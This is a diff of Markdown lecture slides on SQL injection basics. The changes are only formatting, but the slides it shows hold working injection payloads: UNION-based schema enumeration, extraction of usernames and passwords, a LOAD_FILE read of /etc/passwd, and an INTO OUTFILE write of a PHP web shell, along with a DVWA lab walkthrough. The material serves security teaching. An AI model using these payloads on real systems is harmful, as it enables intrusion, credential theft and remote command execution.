@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # SQL Injection Basics
 
 ## The Most Dangerous Web Vulnerability
@@ -16,9 +10,9 @@ paginate: true
 
 ```sql
 -- Application code (PHP)
-$query = "SELECT * FROM users WHERE username='" 
-         . $_POST['username'] 
-         . "' AND password='" 
+$query = "SELECT * FROM users WHERE username='"
+         . $_POST['username']
+         . "' AND password='"
          . $_POST['password'] . "'";
 
 -- Normal input: username=john, password=secret
@@ -123,18 +117,18 @@ Positive indicators:
 1. Database error messages
    "You have an error in your SQL syntax..."
    "ORA-01756: quoted string not properly terminated"
-   
-2. Different behavior with ' vs ''
+
+1. Different behavior with ' vs ''
    Single quote causes error, two singles don't
-   
-3. Boolean differences
-   id=1 AND 1=1  -> Normal response
-   id=1 AND 1=2  -> Different/empty response
-   
-4. Time delays
+
+1. Boolean differences
+   id=1 AND 1=1 -> Normal response
+   id=1 AND 1=2 -> Different/empty response
+
+1. Time delays
    id=1; WAITFOR DELAY '0:0:5'--  -> 5 second delay
-   
-5. Arithmetic evaluation
+
+1. Arithmetic evaluation
    id=2-1  -> Same as id=1 (input is being evaluated)
 ```
 
@@ -275,15 +269,15 @@ Oracle:      --, /* */
 ' UNION SELECT 1,version(),3--
 
 -- Step 4: List all databases
-' UNION SELECT 1,GROUP_CONCAT(schema_name),3 
+' UNION SELECT 1,GROUP_CONCAT(schema_name),3
   FROM information_schema.schemata--
 
 -- Step 5: List tables in target database
-' UNION SELECT 1,GROUP_CONCAT(table_name),3 
+' UNION SELECT 1,GROUP_CONCAT(table_name),3
   FROM information_schema.tables WHERE table_schema='targetdb'--
 
 -- Step 6: List columns in target table
-' UNION SELECT 1,GROUP_CONCAT(column_name),3 
+' UNION SELECT 1,GROUP_CONCAT(column_name),3
   FROM information_schema.columns WHERE table_name='users'--
 
 -- Step 7: Extract data
@@ -300,18 +294,18 @@ URL: /vulnerabilities/sqli/?id=1&Submit=Submit
 
 Step 1: Test for injection
   id=1'              -> Error (injectable!)
-  
+
 Step 2: Determine columns
   id=1' ORDER BY 2-- -  -> Works
   id=1' ORDER BY 3-- -  -> Error (2 columns)
-  
+
 Step 3: Find display columns
   id=' UNION SELECT 1,2-- -
   -> Shows "1" and "2" on page
-  
+
 Step 4: Extract version
   id=' UNION SELECT 1,@@version-- -
-  
+
 Step 5: Dump users
   id=' UNION SELECT user,password FROM users-- -
 ```
@@ -390,7 +384,7 @@ admin' /*
 ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
 
 -- Writing files (MySQL)
-' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 
+' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3
   INTO OUTFILE '/var/www/html/shell.php'--
 ```
 
@@ -498,12 +492,12 @@ Others:   -- | /* */
 Security Level: **Low**
 
 1. Test `id` parameter for injection with `'`
-2. Determine the number of columns
-3. Find which columns are displayed
-4. Extract the MySQL version
-5. List all databases
-6. List all tables in the `dvwa` database
-7. Extract all usernames and password hashes
+1. Determine the number of columns
+1. Find which columns are displayed
+1. Extract the MySQL version
+1. List all databases
+1. List all tables in the `dvwa` database
+1. Extract all usernames and password hashes
 
 ```text
 Target URL:
